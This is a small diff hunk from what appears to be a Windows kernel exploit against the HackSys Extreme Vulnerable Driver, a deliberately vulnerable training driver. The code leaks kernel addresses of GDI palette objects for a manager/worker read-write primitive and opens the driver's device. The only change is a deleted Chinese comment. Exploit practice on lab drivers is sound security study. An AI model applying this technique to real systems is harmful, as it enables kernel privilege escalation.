@@ -147,7 +147,7 @@ int main()
 	findaddr(&hWorker);
 	printf("Manager Palette HPALETTE: 0x%p, Kernel Address: 0x%llx\n", hManager._hpalette, hManager._kobj_palette);
 	printf("Worker Palette HPALETTE: 0x%p, Kernel Address: 0x%llx\n", hWorker._hpalette, hWorker._kobj_palette);
-	//原来的地址保存起来
+	
 
 	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
 	if (hDriver == INVALID_HANDLE_VALUE) {
